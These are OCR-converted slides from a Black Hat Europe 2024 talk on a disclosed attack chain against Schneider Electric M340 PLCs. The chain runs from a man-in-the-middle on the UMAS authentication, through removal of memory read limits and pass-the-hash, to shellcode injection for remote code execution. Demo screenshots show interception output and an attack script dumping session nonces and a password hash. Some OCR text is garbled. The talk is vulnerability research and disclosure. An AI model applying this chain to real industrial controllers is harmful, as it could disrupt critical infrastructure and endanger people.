---
title: "From Pass-the-Hash to Code Execution on Schneider Electric M340 PLCs"
speakers: ["Amir Zaltzman", "Avishai Wool"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2024"
edition: "Europe"
year: 2024
source_pdf: "BlackHat_Europe_2024_slides/Amir Zaltzman & Avishai Wool_From Pass-the-Hash to Code Execution on Schneider Electric M340 PLCs.pdf"
pages: 107
sha256: "4471f928fdbb203353b8cbdc22845ad2e431a7eda5544c0e72b90284eb32a5ee"
text_chars: 37589
ocr_pages: 26
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:48:45Z"
---
# From Pass-the-Hash to Code Execution on Schneider Electric M340 PLCs

**Speakers:** Amir Zaltzman, Avishai Wool  
**Conference:** Black Hat Europe 2024  
**Source:** `BlackHat_Europe_2024_slides/Amir Zaltzman & Avishai Wool_From Pass-the-Hash to Code Execution on Schneider Electric M340 PLCs.pdf` (107 pages)

## Slide 1

## From Pass-the-Hash to Code Execution on Schneider Electric M340 PLCs

Amir Zaltzman, Avishai Wool

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
EWROPE 20 >
DECEMBER 11-12, 2024 | me »/ 2S
4 =
se From Pass-the-Hash to Code Execution
on Schneider Electric M340 PLCs
Amir Zaltzman, Avishai Wool
```

## Slide 2

#### **Who am I?**

### **Amir Zaltzman**

- Embedded security researcher

- M.Sc. graduate under the supervision of **Prof. Avishai Wool** at Tel Aviv University

Information Classification: General

#BHEU @BlackHatEvents

## Slide 3

#### **Motivation**

- With the rise of **Industry 4.0** revolution, industrial devices, including **currentgeneration PLCs** , are increasingly **connected** to the **internet** .

- **PLC vendors** are continuously **enhancing** their **proprietary** security protocols while ensuring **operational compatibility** .

Information Classification: General

#BHEU @BlackHatEvents

## Slide 4

#### **Modicon M340 PLCs**

- **Researched** Schneider Electric's **Modicon M340 PLCs** with the **latest** firmware **version 3.60** (Oct 2024).

- **PLCs** used in **various** industries, such as **water** and **wastewater** management, **oil** and **gas** , **food** and **beverage.**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 5

#### **Management Setup**

UMAS protocol
Engineering station (Client) M340 processor module (Host)
PC PLC

M340 processor module (Host)

Information Classification: General

#BHEU @BlackHatEvents

## Slide 6

#### **UMAS Protocol**

- UMAS (Unified Messaging Application Services) is a **proprietary** Schneider Electric protocol.

- For **configuration** and **monitoring** Modicon PLCs.

- UMAS messages are transmitted over **Modbus/TCP** network, with ‘ **0x5A** ’ Modbus function code.

Modbus
function
Session UMAS UMAS
key function message data
5A

Modbus Header

UMAS message

Information Classification: General

#BHEU @BlackHatEvents

## Slide 7

#### **Session Types**

##### **Public session**

##### **Reserved session**

- **No prior authentication is required.**

- Prior **authentication** is **required** .

Information Classification: General

#BHEU @BlackHatEvents

## Slide 8

#### **Message Types**

##### **Public messages**

##### **Reserved messages**

- Can be transmitted both in **public** and **reserved** sessions.

   - Transmitted in **reserved** sessions **only** .

   - Have **privileged** access rights.

- Have **no** privileged access rights.

   - Are **signed** to verify their authenticity.

- **Lack** any authenticity measures.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 9

#### **Message Types**

##### **Public messages**

- Can be transmitted both in **public** and **reserved** sessions.

- • Have **no** • privileged access rights.ReadMemoryBlock • ReadPhysicalAddress

- • **Lack** any authenticity measures.

   - GetPlcInfo

   - • GetPlcStatus • TakePlcReservation

##### **Reserved messages**

• Transmitted in  reserved  sessions  only .
• Have  privileged  access rights.
• WriteMemoryBlock
• Are  signed  to verify their authenticity.
• WritePhysicalAddress
• BeginDownload
• BeginUpload

• StartTask

Information Classification: General

#BHEU @BlackHatEvents

## Slide 10

#### **Public Messages Structures**

Request

|Function code|Session key|UMAS function
code|Data|
|---|---|---|---|
|0x5A|0x00|…|…|
|1 byte|1 byte|1 byte|Variable size|

ACK/NACK
Function code Session key Data
code
Response
0x5A 0x00 0xFE/0xFD …
1 byte 1 byte 1 byte Variable size

Information Classification: General

#BHEU @BlackHatEvents

## Slide 11

#### **Our Attacks Setup**

PC PLC

Attacker

Information Classification: General

#BHEU @BlackHatEvents

## Slide 12

#### **Our Stairway to RCE**

010101
011010
011100
Remote executing
Memory set up
Step 3 shellcode on-demand
for RCE
Injecting our shellcode and
Full read-access
Step 2
setting up the memory on-demand
on-demand
MitM attack to remove read-access restrictions
Step 1

Information Classification: General

#BHEU @BlackHatEvents

## Slide 13

# Authentication process step-by-step

Information Classification: General

#BHEU @BlackHatEvents

## Slide 14

# Project Password Hash Acquisition

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
* * KA syAcss MODS!
a
Project Password Hash Acquisition
Information Classification: General
```

## Slide 15

#### **Project Password Hash**

- The **project password hash** is the **hashed** format in which the **project password** is stored in the **PLC memory** .

- The **project password hash** and its random **salt** are generated **once** during the creation of a **new project** .

= SHA256( || )
pwdhash pwdsalt pwd

Information Classification: General

#BHEU @BlackHatEvents

## Slide 16

#### **Project Password Hash**

• The **project password hash** is the **hashed** format in which the **project password** is stored in the **PLC memory** . • The **project password hash** and its random **salt** are generated **once** during the creation of a **new project** . The **_pwdhash_** and the **_pwdsalt_** remain **unchanged** , even if the project is modified. **= SHA256( || )** _pwdhash pwdsalt pwd_

Information Classification: General

#BHEU @BlackHatEvents

## Slide 17

#### **Project Password Registration**

Project password:

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Project Password Registration
Project password: *****
ssai30jd uoljedi}UaYINY
Information Classification: General
```

## Slide 18

#### **Project Salt Extraction**

ReadMemoryBlock

Information Classification: General

#BHEU @BlackHatEvents

## Slide 19

#### **Project Password Hash Computation**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 20

#### **Project Password Hash Computation**

Since version  3.50 , the  pwdhash can  no
longer be  extracted  from the PLC memory
using ‘ ReadMemoryBlock ’ message.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 21

# Nonces Exchange

Information Classification: General

#BHEU @BlackHatEvents

## Slide 22

#### **Nonces Exchange**

- We **discovered** that starting at version **3.60** , the **Diffie-Hellman** key exchange mechanism (RFC-3526, 2048-bit MODP) is **used** in this stage.

- The **nonces** are now **encrypted** during **transmission** , instead of **plaintext** used in previous versions.

DHshared AESkey

Information Classification: General

#BHEU @BlackHatEvents

## Slide 23

#### **Nonces Exchange**

• We **discovered** that starting at version **3.60** , the **Diffie-Hellman** key exchange mechanism (RFC-3526, 2048-bit MODP) is used in this stage. • The **nonces** are now **encrypted** during **transmission** , instead of **plaintext** used in previous versions.The implemented mechanism is **“plain vanilla”** , exposed to **MitM** attacks (neither certificate authorities nor pre-shared keys are used).

DHshared AESkey

Information Classification: General

#BHEU @BlackHatEvents

## Slide 24

#### **Nonces Exchange**

NoncePC

NoncePLC

Information Classification: General

#BHEU @BlackHatEvents

## Slide 25

#### **Nonces Exchange**

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Nonces Exchange
ssai30jd uoljedi}UaYINY
Information Classification: General
```

## Slide 26

# Authentication Secret Transmission

Information Classification: General

#BHEU @BlackHatEvents

## Slide 27

#### **Authentication Secret**

- The **authentication secret** is used by the **PLC** to **validate** the **PC's authenticity** .

- **Both** parties compute the **authentication secret** using the required data stored on each side.

**= SHA256(**

**||**

**||**

**|| )**

_authsecret_

Information Classification: General

#BHEU @BlackHatEvents

## Slide 28

#### **Authentication Secret Transmission**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 29

#### **Authentication Secret Verification**

= ?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 30

#### **Session Key Transmission**

rsvID

Information Classification: General

#BHEU @BlackHatEvents

## Slide 31

#### **Authentication Process Finished**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 32

#### **Authentication Process Finished**

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Authentication Process Finished
ssai30jd uoljedi}UaYINY
Information Classification: General
```

## Slide 33

#### **Authentication Process Finished**

Of  all  the  data  gathered during the
authentication process ,  only  the  nonces
are needed to  s ign  the  reserved m essages
in the established session.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 34

# Signing the UMAS Messages

Information Classification: General

#BHEU @BlackHatEvents

## Slide 35

#### **Reserved Messages Structures**

Request

|Function
code|Session
key|UMAS sign
code|Magic|Signature|Function
code|Mess
Session
key|age
UMAS
code|Data|
|---|---|---|---|---|---|---|---|---|
|0x5A|_rsvID_|0x38|0x01|…|0x5A|_rsvID_|…|…|
|1 byte|1 byte|1 byte|1 byte|32 bytes|1 byte|1 byte|1 byte|Variable size|

Message
Function  UMAS sign  Function  ACK/NACK
Session key Magic Signature Session key Data
code code code code
0x5A rsvID 0x38 0x01 … 0x5A rsvID 0xFE/0xFD …
1 byte 1 byte 1 byte 1 byte 32 bytes 1 byte 1 byte 1 byte Variable size

Response

Information Classification: General

#BHEU @BlackHatEvents

## Slide 36

#### **Signature Calculation**

PLCID
GetPlcInfo
= SHA256( || )
= SHA256( || )
= SHA256( ||        ||         )
Signature Message

Information Classification: General

#BHEU @BlackHatEvents

## Slide 37

#### **Signature Calculation**

PLCID
GetPlcInfo
= SHA256( || )
The  nonces  are  saved  in memory only in
= SHA256( || )
their  hashed  form, as the  original  nonces
are  deleted  from memory  once  the
authentication process  is  finished .
= SHA256( ||        ||         )
Signature Message

Information Classification: General

#BHEU @BlackHatEvents

## Slide 38

# Memory Access over UMAS

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
LUI rep
Memory Access over UMAS
Information Classification: General
```

## Slide 39

#### **Memory Access over UMAS**

##### **Read-access**

**Write-access**

- We will **access** the memory over UMAS using ‘ **ReadPhysicalAddress** ’ message.

   - We will **modify** the memory over UMAS using ‘ **WritePhysicalAddress** ’ message.

- This message is a **public** message.

- This message is a **reserved** message.

Address Size

UMAS message data

Address

Size Data

UMAS message data

Information Classification: General

#BHEU @BlackHatEvents

## Slide 40

#### **Read-Access over UMAS**

ReadPhysicalAddress Data
Lowest address Highest address
Up to  firmware  RAM3.30 :
Internal memories External memories Internal peripherals
RAM
CPU memory space
Internal memories External memories Internal peripherals
Information Classification: General CPU memory space #BHEU @BlackHatEvents

Internal peripherals

Information Classification: General

## Slide 41

#### **Read-Access over UMAS**

ReadPhysicalAddress Data

##### : **Up to** firmware **3.30** (information **leak** CVE-2020-7537):

Read-accessible memory
RAM
Internal memories External memories Internal peripherals
CPU memory space #BHEU

Internal peripherals

Information Classification: General

#BHEU @BlackHatEvents

## Slide 42

#### **Read-Access over UMAS**

ReadPhysicalAddress Data

**From** firmware **3.30** and **above** (leakage **fixed** ): **Read-accessible memory**

Internal memories

RAM **???** External memories

Internal peripherals

CPU memory space

Information Classification: General

#BHEU @BlackHatEvents

## Slide 43

#### **Read-Access over UMAS**

Let ’ s fi nd it using  reverse
ReadPhysicalAddress Data
engineering
From  firmware  3.30  and  above  (leakage  fixed ):
Read-accessible memory
RAM
???

External memories

Internal memories

Internal peripherals

CPU memory space

Information Classification: General

#BHEU @BlackHatEvents

## Slide 44

**Readable Memory Range over UMAS From** firmware **3.30** and **above** :

- The **highest** address allowed for **read-access** ( _addr_readtop_ ) is determined using a **linear** function:

= _addr_readtop addr_readbase_ + Const ∙ _addr_readlimiter_

Information Classification: General

#BHEU @BlackHatEvents

## Slide 45

#### **Read-Access over UMAS**

ReadPhysicalAddress Data

##### **From** firmware **3.30** and **above** (leakage **fixed** ):

**Read-accessible memory**

_addr_readbase addr_readtop_

RAM
Internal memories External memories Internal peripherals

Internal memories

Internal peripherals

CPU memory space

Information Classification: General

#BHEU @BlackHatEvents

## Slide 46

#### **Memory Access over UMAS**

##### **Read-access**

##### **Write-access**

- We will **access** the memory over UMAS using ‘ **ReadPhysicalAddress** ’ message.

   - We will **modify** the memory over UMAS using ‘ **WritePhysicalAddress** ’ message.

- This message is a **public** message.

- This message is a **reserved** message.

Address

Size

UMAS message data

Address Size Data
UMAS message data

Information Classification: General

#BHEU @BlackHatEvents

## Slide 47

#### **Write-Access over UMAS**

WritePhysicalAddress ACK

- All **writable** memory pages can be used for **execution** (no NX-bit functionality).

- By default, the OS sets the existing **executable** memory areas to be **writeprotected** .

Information Classification: General

#BHEU @BlackHatEvents

## Slide 48

# Let’s proceed to our attacks

Information Classification: General

#BHEU @BlackHatEvents

## Slide 49

#### **Our Stairway to RCE**

Remote executing
Step 3 shellcode on-demand
Injecting our shellcode and
Step 2
setting up the memory on-demand
MitM attack to remove read-access restrictions
Step 1

Information Classification: General

#BHEU @BlackHatEvents

## Slide 50

#### **Our Stairway to RCE**

But why MitM??
Remote executing
Step 3 shellcode on-demand
Injecting our shellcode and
Step 2
setting up the memory on-demand
MitM attack to remove read-access restrictions
Step 1

Information Classification: General

#BHEU @BlackHatEvents

## Slide 51

#### **Awaiting Nonces Exchange Stage**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 52

#### **Awaiting Nonces Exchange Stage**

MitM attack to steal the nonces
CVE-2024-8935

Information Classification: General

#BHEU @BlackHatEvents

## Slide 53

#### **MitM Attack to Steal the Nonces**

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
MitM | Attack to Steal the Nonces
ssaisoid T dais
Information Classification: General
```

## Slide 54

#### **MitM Attack to Steal the Nonces**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 55

#### **MitM Attack to Steal the Nonces**

**Reserved messages** transmitted to the PLC by an **unauthenticated** attacker will be **accepted** if they ar ~~e~~ **~~validly~~** ~~con~~ structed (using the session **nonces** ).

Reserved for PC
OK
Unauthenticated

Information Classification: General

#BHEU @BlackHatEvents

## Slide 56

#### **Remove Read-Access Restrictions**

Read-accessible
memory
RAM
CPU memory space
Information Classification: General

Information Classification: General

#BHEU @BlackHatEvents

## Slide 57

#### **Remove Read-Access Restrictions**

Modifying memory to allow
Read-accessible
read-anywhere on-demand
memory
CVE-2024-8936
RAM
CPU memory space
Information Classification: General

#BHEU @BlackHatEvents

## Slide 58

#### **Remove Read-Access Restrictions**

ACK
addr_readlimiter
WritePhysicalAddress
Read-accessible
memory
RAM
CPU memory space
Information Classification: General

Information Classification: General

#BHEU @BlackHatEvents

## Slide 59

#### **Remove Read-Access Restrictions**

ACK
addr_readlimiter
WritePhysicalAddress
Read-accessible
memory
RAM
CPU memory space
Information Classification: General

Information Classification: General

#BHEU @BlackHatEvents

## Slide 60

#### **Our Stairway to RCE**

Remote executing
Step 3 shellcode on-demand
Injecting our shellcode and
Full read-access
Step 2
setting up the memory on-demand
on-demand
MitM attack to remove read-access restrictions
Step 1

Information Classification: General

#BHEU @BlackHatEvents

## Slide 61

#### **Accessing a Reserved Session**

**Option 2**

Option 1

   - A **reserved** session is ongoing

- A **public** session is ongoing

Information Classification: General

#BHEU @BlackHatEvents

## Slide 62

#### **Option 1 - Pass-the-Hash**

ReadPhysicalAddress

Information Classification: General

#BHEU @BlackHatEvents

## Slide 63

#### **Option 1 - Reserve a Session**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 64

#### **Accessing a Reserved Session**

**Option 2**

##### **Option 1**

   - A **reserved** session is ongoing

- A **public** session is ongoing

Step 2 progress

Information Classification: General

#BHEU @BlackHatEvents

## Slide 65

#### **Option 2 - Steal the Hashed Nonces**

ReadPhysicalAddress

Information Classification: General

#BHEU @BlackHatEvents

## Slide 66

#### **Option 2 - Steal the Hashed Nonces**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 67

#### **Access a Reserved Session**

Option 1  Option 2
• A  public  session is ongoing  • A  reserved  session is ongoing
We can proceed with either  Option 1  or
Option 2 , as the next steps are the  same
for both.

**Option 2**

• A  reserved  session is ongoing

Information Classification: General

#BHEU @BlackHatEvents

## Slide 68

Shellcode Injection

Modifying memory to allow
Writable RCE on-demand
Write-protected CVE-2024-8937 or CVE-2024-8938
A section of the RAM memory space
Firmware code

Information Classification: General

#BHEU @BlackHatEvents

## Slide 69

Shellcode Injection

Writable
Write-protected
A section of the RAM memory space

Firmware code

Information Classification: General

#BHEU @BlackHatEvents

## Slide 70

Shellcode Injection

WritePhysicalAddress ACK

Shellcode

Firmware code

Information Classification: General

#BHEU @BlackHatEvents

## Slide 71

Overriding Function Pointer

Source Destination
function function Shellcode

Firmware code

Information Classification: General

#BHEU @BlackHatEvents

## Slide 72

Overriding Function Pointer

WritePhysicalAddress ACK
Source Destination
function function Shellcode

Firmware code

Information Classification: General

#BHEU @BlackHatEvents

## Slide 73

#### **Overriding Function Pointer**

WritePhysicalAddress ACK
Source Destination
function function Shellcode
Firmware code

Information Classification: General

#BHEU @BlackHatEvents

## Slide 74

Our Stairway to RCE

Remote executing
Memory set up
Step 3 shellcode on-demand
for RCE
Injecting our shellcode and
Step 2
setting up the memory on-demand
MitM attack to remove read-access restrictions
Step 1

Information Classification: General

#BHEU @BlackHatEvents

## Slide 75

Source function
2 nd
pointer
Destination function
Shellcode

Triggering our Shellcode

Information Classification: General

#BHEU @BlackHatEvents

## Slide 76

Triggering our Shellcode
Source function
2 nd
pointer
Destination function
Shellcode

Information Classification: General

#BHEU @BlackHatEvents

## Slide 77

Triggering our Shellcode
Source function
11001111110
Shellcode executed!
2 nd
pointer 1100 0011 100
Destination function 111101 10 001
10100101010
Shellcode

Information Classification: General

#BHEU @BlackHatEvents

## Slide 78

It’s time for a demo

Information Classification: General

#BHEU @BlackHatEvents

## Slide 79

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
Power on
a:
al
Information Classification: General
```

## Slide 80

Information Classification: General

#BHEU @BlackHatEvents

## Slide 81

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
123.45.67.10/255.255.0.0
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...
34 plugins
42 protocol dissectors
57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!
Starting Bridged sniffing...
Text only Interface activated...
Hit 'h' for inline help
Information Classification: General
```

## Slide 82

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
a2 ae [ Start reserving PLC
amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
123.45.67.10/255.255.0.0
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...
34 plugins
42 protocol dissectors
57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!
Starting Bridged sniffing...
Text only Interface activated...
Hit 'h' for inline help
Information Classification: General
```

## Slide 83

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
| wa PLC Application Password <BR !
amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
123.45.67.10/255.255.0.0
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...
34 plugins
42 protocol dissectors
57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!
Starting Bridged sniffing...
Text only Interface activated...
Hit 'h' for inline help
Information Classification: General
```

## Slide 84

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo
Starting Bridged sniffing...
Text only Interface activated...
Hit 'h' for inline help
Captured PC Diffie-Hellman public key message
Dropped the message... .
Sending attacker's Diffie-Hellman public key message to the PLC instead
Captured response message from PLC
Dropped the message...
Sending attacker's response message to the PC
Captured PC nonce message
Dropped the message...
Sending attacker's nonce message to the PLC instead
Captured response message from PLC
Dropped the message...
Sending attacker's response message to the PC
Captured PC authentication request message
Forwarded the message...
Information Classification: General
```

## Slide 85

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Reserved session established Reserved
(sade —
amirz@ubuntu: ~/Documents/BlackHat_demo amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: -~/Documents/BlackHat_demo
Starting Bridged sniffing...
I
Text only Interface activated...
Hit 'h' for inline help
Captured PC Diffie-Hellman public key message
Dropped the message...
Sending attacker's Diffie-Hellman public key message to the PLC instead
Captured response message from PLC
Dropped the message...
Sending attacker's response message to the PC
Captured PC nonce message
Dropped the message...
Sending attacker's nonce message to the PLC instead
Captured response message from PLC
Dropped the message...
Sending attacker's response message to the PC
Captured PC authentication request message
Forwarded the message...
Information Classification: General
```

## Slide 86

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
J
G
>
J
Information Classification: General
amirz@ubunt uments/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amir
5 6bc26d8048ac62894151c2dbefe184ec38e641513dcca4640260c461e7b261b3b3b6313375d23aat6b70b8bb97668T8
db774f2322e0f £4cd333d7083da9a5dd150336ec986a85d9e81a9851c531c9163b8e29a044014036a78c83ccccaaf245
3662e013a4736b2487 fbc826f6Ff fb52de3eccf6e8793bal0043da3bc674629decf5fb5cde7a8758163c6900a8745edal
405c6891dd564f797b3d07 fa77d90b8e6119035b6b29a2da9Ff f12aflbbf50ed25af4154d5514d14cea70ad0d08ddb81b
901e4e4e26d2a232222a474435a811F50d508d3d48ac03f8378",
"plc shared": "c7f520477c53400be51db678c2128d0549bb4ca69d75cl1lce2al72elcb19eldcalaac1c7055d64
07a7b81a81221f473e69b827c faceld734b9bf5e849a4309c33cccf5ecOd7d68cfdf218e917aafOf42589dd8c8c9Ff7c6
63a0101ce588ddf62cdbbelf2b63da23e2241c6eae56912ee926c0 fF 8ddel98d807923dd5bf8Fc92455fO548c0af fc6fb
5492f2071978e4620545595a0175baa7ce5386218b1a058dc82242c7758d0ab7al6b0b3b05cb6f feQaa0b98ed5d7d78c
70cbde2159b1301bf cOd6df593c1d751f139 fO4db05a4ecdeO3ee7 cd9d7e7204F21a04df52025ce7 2e Fee
ab42a3e560b747971102cc225efb07a225992e4951d9022Ff9b7",
"aes pc": "bal0aaa9e18f428d9ab2fc717b779cd79ee70F edd679d3e6a33b0824ca600981", Steal the nonces
"aes plc": "2d0761da402e0f547db7a935c62c79437b/0ed7e3b5417b15a65cac438698101",
"pc nonce enc pc": "8effc35463bdad577867eb2102641c55dbd454c3897ab84e2 fbd61b5f47824ay =
" ARFAFRATCRIAHAITOhRec208ccRedeQRkc"
"pc nonce dec": "668c6dc01c698fb6b2b706d9b91b1889731044076c36f636e395bc2e743fal29",
pe monce enc plc . PICSCHD LD4DT CSS TE4O04d Sd ZUUZ5U9 TS S504 dDdDS LOUZ9505e7T 1051 DS0909TO
“fe28hellabh2ohhoeGefathalerhle fads tho fkac OhASP lab ai feahes”
"e175ca0fa74105d654bc7 f43741e776737191bd4a023008a5d23da28d9cBefO"
ubuntu: -/Do nts/BlackHat_demo amirz@ubuntu: -/Documents/BlackHat_demo x
pL nance enc nich:
"ple_ nonce dec":
‘pre MOTICE Enc pe.
“SUETUUSE dda T 17 CUGUUUSST COSCOUE 1407 COST USUZ4Z5ECUSS TT S7 dar eur 7.
$f
```

## Slide 87

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
s/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documen
ab42a3e560074 971102¢c225efb07a225992e495 1490227967",
"aes pc": "balOaaa9e18428d9ab2fc717b779cd79ee70fedd679d3e6a33b0824ca600981",
"aes plc": "2d0761da402e0f547db7a935c62c79437b70ed7e3b5417b15a65cac438698101",
"pc nonce enc pc": "8effc35463bdad577867eb2102641c55dbd454c3897ab84e2 fbd61b5f47824d9",
"pc salt": "46f4f37c824be279b8cc295cc8ede98c",
"pc nonce dec": "668c6dc01c698fb6b2b706d9b91b1889731044076c36f636e395bc2e743fal29",
"pc nonce enc plc": "f9c4cbb1b4bfc58fe46d4a3a2002509133b4abdb816029568ef 1d3fb36969f8e" ,
"plc_nonce enc plc": "fe38bel2abb39b693e6e faf6a23e3blef9453F2169f5ec964581ab197feabelc",
"plc_nonce dec": "el75ca0fa74105d654bc7f43741e776737F191bd4a023008a5d23da28d9c8efO",
"plc nonce enc pc": "“edef008ea8aal17cdaddd59fc83c60a1l4b7c69F09c2425ecb93 1 f 2
} ub : $ python3 umas_read_limit_patch.py
Connected to PLC at 123.45.67.89
Checking if PLC address read limit is patched...
PLC address read limit is NOT patched
Do you want to patch it? [Y/n] Y
Checking PLC session status...
PLC session is reserved:
Resever name: DESKTOP-TL4SLLV
Resever ID: 0xA3320000
Insert session key:
Information Classification: General
```

## Slide 88

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
amirz@ubuntu:~/Documents/BlackHat_demo x amirz@ubuntu;: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
Do you want to patch it? [Y/n] Y
Checking PLC session status...
PLC session is reserved:
Resever name: DESKTOP-TL4SLLV
Resever ID: 0xA3320000
Insert session key:
9e
Insert PC nonce:
668c6dc01c698 fb6b2b706d9b91b1889731044076c36f636e395bc2e743fal29
Insert PLC nonce:
e175ca0fa74105d654bc7 £43741e7 76737 F191bd4a023008a5d23da28d9c8efO
Getting PLC ID...
PLC ID: 06010301
Patching PLC...
PLC address read limit patched successfully :)
Choose an option:
1) Read reserved session hashed nonces
2) Read project hashed password
3) Read memory data manually
QO) Exit
Information Classification: General
```

## Slide 89

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Unreserve Unreserved
They
5)
basal
amirz@ubuntu:~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x
PLC session is reserved:
Resever name: DESKTOP-TL4SLLV
Resever ID: 0xA3320000
Insert session key:
9e
Insert PC nonce:
668c6dc01c698fb6b2b706d9b91b1889731044076c36f636e395bc2e743fal29
Insert PLC nonce:
e175ca0fa74105d654bc7f43741e776737F191bd4a023008a5d23da28d9c8e>fO
Getting PLC ID...
PLC ID: 06010301
Patching PLC...
PLC address read limit patched successfully :)
Choose an option:
1) Read reserved session hashed nonces
2) Read project hashed password
3) Read memory data manually
0) Exit
0
Bye
Information Classification: General
```

## Slide 90

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
Information Classification: General
amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x
Bye
: ¢$ python3 umas_ read limit _patch.py
Connected to PLC at 123.45.67.89
Checking if PLC address read limit is patched...
PLC address read limit is patched :)
Choose an option:
1) Read reserved session hashed nonces
2) Read project hashed password
3) Read memory data manually
0) Exit
2
Proiect nassword hash (hase 64):
FNMEG6SpcMqpoEGX6rb/WePOVOuZVacYXENRMdaZe58=
RMuusoc ait VUptivil.
1) Read reserved session hashed nonces
2) Read project hashed password
3) Read memory data manually
0) Exit
amirz@ubuntu: ~/Documents/BlackHat_de
o x
```

## Slide 91

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
Text only Interface activated...
Hit 'h' for inline help
Captured PC Diffie-Hellman public key message
Dropped the message...
Sending attacker's Diffie-Hellman public key message to the PLC instead
Captured response message from PLC
Dropped the message...
Sending attacker's response message to the PC
Captured PC nonce message
Dropped the message... i
Sending attacker's nonce message to the PLC instead Turn back traffic
Captured response message from PLC
Dropped the message...
Sending attacker's response message to the PC
Captured PC authentication request message _—_
Forwarded the message...
